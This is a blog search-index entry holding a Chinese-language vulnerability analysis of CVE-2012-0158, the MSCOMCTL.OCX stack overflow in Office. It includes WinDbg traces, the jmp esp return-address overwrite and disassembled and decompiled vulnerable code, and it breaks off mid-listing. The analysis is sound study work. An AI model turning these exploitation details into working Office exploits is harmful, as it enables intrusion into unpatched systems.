<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>CVE-2012-0158 漏洞分析</title>
      <link href="/2018/07/28/CVE-2012-0158-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2018/07/28/CVE-2012-0158-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="一-样本概况"><a href="#一-样本概况" class="headerlink" title="一 样本概况"></a>一 样本概况</h1><p>一个基于栈内存越界拷贝的office漏洞。</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>Win7 x86<br>office 2003<br>windbg<br>火绒剑   </p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>MSCOMCTL.OCX模块是office解析ActiveX控件用到的一个动态库，当一个office相关文档中包含ActiveX这类的控件元素的话，比如按钮、列表、树形控件等，当文档通过office打开时，MSCOMCTL.OCX就会被载入到office程序的进程空间，调用其来解析显示空间，当office解析到一个被构造好的控件，比如列表控件，就会发生栈内存越界拷贝。   </p><h2 id="分析目标"><a href="#分析目标" class="headerlink" title="分析目标"></a>分析目标</h2><p>漏洞利用原理</p><h1 id="行为分析"><a href="#行为分析" class="headerlink" title="行为分析"></a>行为分析</h1><p>拿到POC，运行一下发现弹出错误，如下图：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/2.png?x-oss-process=style/yangruiqi.com" alt="1"><br>然后运行一下样本，会弹出计算器，如下图：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/1.png?x-oss-process=style/yangruiqi.com" alt="2"><br>所以这个exp的shellcode在运行时候会释放文件，用火绒剑观察一下，如下图：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/3.png?x-oss-process=style/yangruiqi.com" alt="3"><br>感染PE文件，启动自释放文件。去路径下去看a.exe就是计算器。  </p><p>打开样本弹出计算器，所以Shellcode应该会调用WinExec函数。用Windbg附加WINWORD.EXE，bp kernel32!WinExec下断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:009&gt; bp kernel32!WInExec</span><br><span class="line">0:009&gt; bl</span><br><span class="line"> 0 e 76d9e695     0001 (0001)  0:**** kernel32!WinExec</span><br><span class="line">0:009&gt; g</span><br></pre></td></tr></table></figure><p>然后g，把样本拖进word。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ModLoad: 27580000 27685000   C:\Windows\system32\MSCOMCTL.OCX</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=0012163b ebx=0001c000 ecx=00121568 edx=77cc64f4 esi=0001c000 edi=0c00afe6</span><br><span class="line">eip=76d9e695 esp=00121588 ebp=001215a0 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">kernel32!WinExec:</span><br><span class="line">76d9e695 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure><p>程序断在WinExec入口点。这时候计算器还没弹出来，看一下WinExec的参数，发现是a.exe。我去到这个目录，发现它就是一个计算器。<br>看来shellcode应该是把系统的calc复制到别的目录再运行它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd esp</span><br><span class="line">00121588  00121852 0beaca80 00000000 0beaca80</span><br><span class="line">00121598  0001c000 00000744 001215f0 00121a78</span><br><span class="line">001215a8  0bfec2a8 0c00aff0 0001c000 00000001</span><br><span class="line">001215b8  275c8a0a 0c00aff0 0bfec2a8 0001c000</span><br><span class="line">001215c8  00000000 0bf27078 0bfec290 00002d26</span><br><span class="line">001215d8  00002d26 0bfe9a48 00002841 0002159e</span><br><span class="line">001215e8  00000000 00000744 00000000 00121669</span><br><span class="line">001215f8  1005c48b c7000001 4d032400 005ae908</span><br><span class="line">0:000&gt; da 0beaca80</span><br><span class="line">0beaca80  &quot;C:\Users\15pb-win7\a.exe&quot;</span><br></pre></td></tr></table></figure><p>WinExec的返回地址是0x00121852。往上翻翻，没发现shellcode从哪开始。Kb打印堆栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00121584 00121852 0beaca80 00000000 0beaca80 kernel32!WinExec</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\MSCOMCTL.OCX - </span><br><span class="line">001215b4 275c8a0a 0c00aff0 0bfec2a8 0001c000 0x121852</span><br><span class="line">001215f0 00121669 1005c48b c7000001 4d032400 MSCOMCTL!DllGetClassObject+0x41cc6</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 0x121669</span><br></pre></td></tr></table></figure><p>重新载入，在MSCOMCTL!DllGetClassObject+0x41cc0下断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">275c89fd ff75f4          push    dword ptr [ebp-0Ch]</span><br><span class="line">275c8a00 8d45f8          lea     eax,[ebp-8]</span><br><span class="line">275c8a03 53              push    ebx</span><br><span class="line">275c8a04 50              push    eax</span><br><span class="line">275c8a05 e863fdffff      call    MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)</span><br><span class="line">275c8a0a 8bf0            mov     esi,eax</span><br><span class="line">275c8a0c 83c40c          add     esp,0Ch</span><br><span class="line">275c8a0f 85f6            test    esi,esi</span><br><span class="line">275c8a11 7c3d            jl      MSCOMCTL!DllGetClassObject+0x41d0c (275c8a50)</span><br><span class="line">275c8a13 837df800        cmp     dword ptr [ebp-8],0</span><br><span class="line">275c8a17 8b7d08          mov     edi,dword ptr [ebp+8]</span><br></pre></td></tr></table></figure><p>断在这个call的上一句，Kb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">001215e8 275e701a 06642584 0d9a08e8 00000000 MSCOMCTL!DllGetClassObject+0x41cc0</span><br><span class="line">00121610 275e7361 06642584 0d9a08e8 0d9a08e8 MSCOMCTL!DLLGetDocumentation+0xd08</span><br><span class="line">00121630 275ca8b6 0bfabe80 0d9a08e8 0bfabcd8 MSCOMCTL!DLLGetDocumentation+0x104f</span><br><span class="line">001216b0 2758aee8 0bfabc88 00000000 0d9a08e8 MSCOMCTL!DllGetClassObject+0x43b72</span><br><span class="line">001216e0 27600908 0bfabcd8 0d9a08e8 00000000 MSCOMCTL!DllGetClassObject+0x41a4</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Microsoft Office\OFFICE11\WINWORD.EXE - </span><br><span class="line">001216f4 301ecdcd 0bfabcdc 0d9a08e8 00000000 MSCOMCTL!DllUnregisterServer+0xc31</span><br></pre></td></tr></table></figure><p>发现这一层函数的返回地址是0x 275e701a，它前面一个call是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 275e701a -5</span><br><span class="line">MSCOMCTL!DLLGetDocumentation+0xd03:</span><br><span class="line">275e7015 e8ad19feff      call    MSCOMCTL!DllGetClassObject+0x41c83 (275c89c7)</span><br><span class="line">275e701a 85c0            test    eax,eax</span><br><span class="line">275e701c 7c27            jl      MSCOMCTL!DLLGetDocumentation+0xd33 (275e7045)</span><br></pre></td></tr></table></figure><p>判断溢出点就是这个call里面。</p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/5.png?x-oss-process=style/yangruiqi.com" alt="5"></p><p>发现了熟悉的发现万能跳转0x7ffa4512和shellcode。并且在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">275c8a05 e863fdffff      call    MSCOMCTL!DllGetClassObject+0x41a29 (275c876d)</span><br></pre></td></tr></table></figure><p>之前这里还没有被shellcode覆盖，显然，溢出发生在此<br>几个单步<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/6.png?x-oss-process=style/yangruiqi.com" alt="6"></p><p>Shellcode通过jmp esp覆盖返回地址利用。<br>接下来用IDA打开有漏洞的MSCOMCTL.OCX。定位前面那两个关键call，先看上层call，直接跳到文章后面打开IDA处，下面这段是另一种定位关键call的方法。</p><p>因为释放文件时需要调用kernel32.dll中的GetFileSize函数来判断需要释放的文件。所以Windbg开始调试POC时候，在GetFileSize函数下断，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp kernel32!GetFileSize</span><br></pre></td></tr></table></figure></p><p>但是Word运行时会调用很多次GetFileSize，直接下断点的话，会执行很多次。<br>我们知道漏洞出现MSCOMCTL.OCX,因此我们可以在加载MSCOMCTL.OCX后在对GetFileSize下断点。用到命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sxe ld:MSCOMCTL.OCX</span><br></pre></td></tr></table></figure></p><p>加载MSCOMCTL.OCX时候会断下来。bp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; sxe ld:MSCOMCTL.OCX</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 27580000 27685000   C:\Windows\system32\MSCOMCTL.OCX</span><br><span class="line">eax=00000000 ebx=00000000 ecx=30036f04 edx=77cc64f4 esi=7ffdf000 edi=0012049c</span><br><span class="line">eip=77cc64f4 esp=001203b4 ebp=00120408 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">77cc64f4 c3              ret</span><br><span class="line">0:000&gt; bp kernel32!GetFileSize</span><br><span class="line">0:000&gt; bl</span><br><span class="line"> 0 e 768f0273     0001 (0001)  0:**** kernel32!GetFileSize</span><br></pre></td></tr></table></figure><p>然后g运行程序，程序停在GetFileSize处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=00121617 ebx=0dff08e8 ecx=00000049 edx=000001af esi=0012164f edi=0012165b</span><br><span class="line">eip=76d55d47 esp=001215ac ebp=001215f0 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">kernel32!GetFileSize:</span><br><span class="line">76d55d47 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure><p>反汇编窗口如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">76d55d47 8bff            mov     edi,edi</span><br><span class="line">76d55d49 55              push    ebp</span><br><span class="line">76d55d4a 8bec            mov     ebp,esp</span><br><span class="line">76d55d4c 5d              pop     ebp</span><br><span class="line">76d55d4d eb05            jmp     kernel32!GetFileSize+0xd (76d55d54)</span><br><span class="line">76d55d4f 90              nop</span><br><span class="line">76d55d50 90              nop</span><br><span class="line">76d55d51 90              nop</span><br><span class="line">76d55d52 90              nop</span><br><span class="line">76d55d53 90              nop</span><br><span class="line">76d55d54 ff25d419d176    jmp     dword ptr [kernel32+0x19d4 (76d119d4)]</span><br><span class="line">76d55d5a 83c00a          add     eax,0Ah</span><br><span class="line">76d55d5d 83c10a          add     ecx,0Ah</span><br><span class="line">76d55d60 e907ab0000      jmp     kernel32!DuplicateHandle+0x236 (76d6086c)</span><br><span class="line">76d55d65 83c00c          add     eax,0Ch</span><br><span class="line">76d55d68 83c10c          add     ecx,0Ch</span><br><span class="line">76d55d6b e9fcaa0000      jmp     kernel32!DuplicateHandle+0x236 (76d6086c)</span><br><span class="line">76d55d70 90              nop</span><br><span class="line">76d55d71 90              nop</span><br><span class="line">76d55d72 90              nop</span><br><span class="line">76d55d73 90              nop</span><br><span class="line">76d55d74 90              nop</span><br></pre></td></tr></table></figure></p><p>然后gu跳出GetFileSize函数，程序已经进入shellcode区域</p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/4.png?x-oss-process=style/yangruiqi.com" alt="4"></p><p>观察堆栈调用上一层是MSCOMCTL!DllGetClassObject+0x41cc6 处</p><p>观察下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u MSCOMCTL!DllGetClassObject+0x41cc6</span><br><span class="line">MSCOMCTL!DllGetClassObject+0x41cc6:</span><br><span class="line">275c8a0a 8bf0            mov     esi,eax</span><br><span class="line">275c8a0c 83c40c          add     esp,0Ch</span><br><span class="line">275c8a0f 85f6            test    esi,esi</span><br><span class="line">275c8a11 7c3d            jl      MSCOMCTL!DllGetClassObject+0x41d0c (275c8a50)</span><br><span class="line">275c8a13 837df800        cmp     dword ptr [ebp-8],0</span><br><span class="line">275c8a17 8b7d08          mov     edi,dword ptr [ebp+8]</span><br><span class="line">275c8a1a 742a            je      MSCOMCTL!DllGetClassObject+0x41d02 (275c8a46)</span><br><span class="line">275c8a1c 83650c00        and     dword ptr [ebp+0Ch],0</span><br></pre></td></tr></table></figure><h2 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h2><p>猜测是判断出问题溢出，然后观察地址275c8a50处，猜测问题出在此处附近，打开IDA打开MSCOMCTL.OCX模块，定位到此处。此处反汇编如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.text:275C89C7 ; int __stdcall sub_275C89C7(int, BSTR bstrString)</span><br><span class="line">.text:275C89C7 sub_275C89C7    proc near               ; CODE XREF: sub_275C8807+10p</span><br><span class="line">.text:275C89C7                                         ; sub_275E7004+11p ...</span><br><span class="line">.text:275C89C7</span><br><span class="line">.text:275C89C7 var_14          = dword ptr -14h</span><br><span class="line">.text:275C89C7 dwBytes         = dword ptr -0Ch</span><br><span class="line">.text:275C89C7 var_8           = dword ptr -8</span><br><span class="line">.text:275C89C7 var_4           = dword ptr -4</span><br><span class="line">.text:275C89C7 arg_0           = dword ptr  8</span><br><span class="line">.text:275C89C7 bstrString      = dword ptr  0Ch</span><br><span class="line">.text:275C89C7</span><br><span class="line">.text:275C89C7 ; FUNCTION CHUNK AT .text:275D3085 SIZE 0000001D BYTES</span><br><span class="line">.text:275C89C7</span><br><span class="line">.text:275C89C7                 push    ebp</span><br><span class="line">.text:275C89C8                 mov     ebp, esp</span><br><span class="line">.text:275C89CA                 sub     esp, 14h</span><br><span class="line">.text:275C89CD                 push    ebx</span><br><span class="line">.text:275C89CE                 mov     ebx, [ebp+bstrString]</span><br><span class="line">.text:275C89D1                 push    esi</span><br><span class="line">.text:275C89D2                 push    edi</span><br><span class="line">.text:275C89D3                 push    0Ch             ; dwBytes</span><br><span class="line">.text:275C89D5                 lea     eax, [ebp+var_14]</span><br><span class="line">.text:275C89D8                 push    ebx             ; lpMem</span><br><span class="line">.text:275C89D9                 push    eax             ; int</span><br><span class="line">.text:275C89DA                 call    sub_275C876D</span><br><span class="line">.text:275C89DF                 add     esp, 0Ch</span><br><span class="line">.text:275C89E2                 test    eax, eax</span><br><span class="line">.text:275C89E4                 jl      short loc_275C8A52</span><br><span class="line">.text:275C89E6                 cmp     [ebp+var_14], 6A626F43h</span><br><span class="line">.text:275C89ED                 jnz     loc_275D3085</span><br><span class="line">.text:275C89F3                 cmp     [ebp+dwBytes], 8</span><br><span class="line">.text:275C89F7                 jb      loc_275D3085</span><br><span class="line">.text:275C89FD                 push    [ebp+dwBytes]   ; dwBytes</span><br><span class="line">.text:275C8A00                 lea     eax, [ebp+var_8]</span><br><span class="line">.text:275C8A03                 push    ebx             ; lpMem</span><br><span class="line">.text:275C8A04                 push    eax             ; int</span><br><span class="line">.text:275C8A05                 call    sub_275C876D</span><br><span class="line">.text:275C8A0A                 mov     esi, eax</span><br><span class="line">.text:275C8A0C                 add     esp, 0Ch</span><br><span class="line">.text:275C8A0F                 test    esi, esi</span><br><span class="line">.text:275C8A11                 jl      short loc_275C8A50</span><br><span class="line">.text:275C8A13                 cmp     [ebp+var_8], 0</span><br><span class="line">.text:275C8A17                 mov     edi, [ebp+arg_0]</span><br><span class="line">.text:275C8A1A                 jz      short loc_275C8A46</span><br><span class="line">.text:275C8A1C                 and     [ebp+bstrString], 0</span><br><span class="line">.text:275C8A20                 lea     eax, [ebp+bstrString]</span><br><span class="line">.text:275C8A23                 push    ebx             ; int</span><br><span class="line">.text:275C8A24                 push    eax             ; len</span><br><span class="line">.text:275C8A25                 call    sub_275C8A59</span><br><span class="line">.text:275C8A2A                 mov     esi, eax</span><br><span class="line">.text:275C8A2C                 pop     ecx</span><br><span class="line">.text:275C8A2D                 test    esi, esi</span><br><span class="line">.text:275C8A2F                 pop     ecx</span><br><span class="line">.text:275C8A30                 jl      short loc_275C8A50</span><br><span class="line">.text:275C8A32                 push    [ebp+bstrString] ; strIn</span><br><span class="line">.text:275C8A35                 lea     ecx, [edi-24h]</span><br><span class="line">.text:275C8A38                 call    sub_27585BE7</span><br><span class="line">.text:275C8A3D                 push    [ebp+bstrString] ; bstrString</span><br><span class="line">.text:275C8A40                 call    ds:SysFreeString</span><br><span class="line">.text:275C8A46</span><br><span class="line">.text:275C8A46 loc_275C8A46:                           ; CODE XREF: sub_275C89C7+53j</span><br><span class="line">.text:275C8A46                 cmp     [ebp+var_4], 0</span><br><span class="line">.text:275C8A4A                 jnz     loc_275D308F</span><br><span class="line">.text:275C8A50</span><br><span class="line">.text:275C8A50 loc_275C8A50:                           ; CODE XREF: sub_275C89C7+4Aj</span><br><span class="line">.text:275C8A50                                         ; sub_275C89C7+69j ...</span><br><span class="line">.text:275C8A50                 mov     eax, esi</span><br><span class="line">.text:275C8A52</span><br><span class="line">.text:275C8A52 loc_275C8A52:                           ; CODE XREF: sub_275C89C7+1Dj</span><br><span class="line">.text:275C8A52                                         ; sub_275C89C7+A6C3j</span><br><span class="line">.text:275C8A52                 pop     edi</span><br><span class="line">.text:275C8A53                 pop     esi</span><br><span class="line">.text:275C8A54                 pop     ebx</span><br><span class="line">.text:275C8A55                 leave</span><br><span class="line">.text:275C8A56                 retn    8</span><br><span class="line">.text:275C8A56 sub_275C89C7    endp</span><br></pre></td></tr></table></figure><p>F5反编译一下如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_275C89C7</span><span class="params">(<span class="keyword">int</span> a1, BSTR bstrString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  BSTR v2; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+Ch] [bp-14h]@1</span></span><br><span class="line">  SIZE_T dwBytes; <span class="comment">// [sp+14h] [bp-Ch]@3</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+18h] [bp-8h]@4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-4h]@8</span></span><br><span class="line"></span><br><span class="line">  v2 = bstrString;</span><br><span class="line">  result = sub_275C876D((<span class="keyword">int</span>)&amp;v5, bstrString, <span class="number">0xC</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1784835907</span> &amp;&amp; dwBytes &gt;= <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_275C876D((<span class="keyword">int</span>)&amp;v7, v2, dwBytes);</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v7 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">        bstrString = <span class="number">0</span>;</span><br><span class="line">        v4 = sub_275C8A59((UINT)&amp;bstrString, (<span class="keyword">int</span>)v2);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_27585BE7(bstrString);</span><br><span class="line">          SysFreeString(bstrString);</span><br><span class="line">LABEL_8:</span><br><span class="line">          <span class="keyword">if</span> ( v8 )</span><br><span class="line">            v4 = sub_275C8B2B(a1 + <span class="number">20</span>, v2);</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> v4;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">-2147418113</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_275C876D</span><span class="params">(<span class="keyword">int</span> a1, LPVOID lpMem, SIZE_T dwBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  LPVOID v3; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  LPVOID v5; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// esi@4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+Ch] [bp-4h]@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *lpMema; <span class="comment">// [sp+1Ch] [bp+Ch]@3</span></span><br><span class="line"></span><br><span class="line">  v3 = lpMem;</span><br><span class="line">  result = (*(<span class="keyword">int</span> (__stdcall **)(LPVOID, <span class="keyword">int</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>, _DWORD))(*(_DWORD *)lpMem + <span class="number">12</span>))(lpMem, &amp;v7, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == dwBytes )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = HeapAlloc(hHeap, <span class="number">0</span>, dwBytes);</span><br><span class="line">      lpMema = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (*(<span class="keyword">int</span> (__stdcall **)(LPVOID, LPVOID, SIZE_T, _DWORD))(*(_DWORD *)v3 + <span class="number">12</span>))(v3, v5, dwBytes, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy((<span class="keyword">void</span> *)a1, lpMema, dwBytes);</span><br><span class="line">          v6 = (*(<span class="keyword">int</span> (__stdcall **)(LPVOID, <span class="keyword">void</span> *, SIZE_T, _DWORD))(*(_DWORD *)v3 + <span class="number">12</span>))(</span><br><span class="line">                 v3,</span><br><span class="line">                 &amp;unk_27632368,</span><br><span class="line">                 ((dwBytes + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - dwBytes,</span><br><span class="line">                 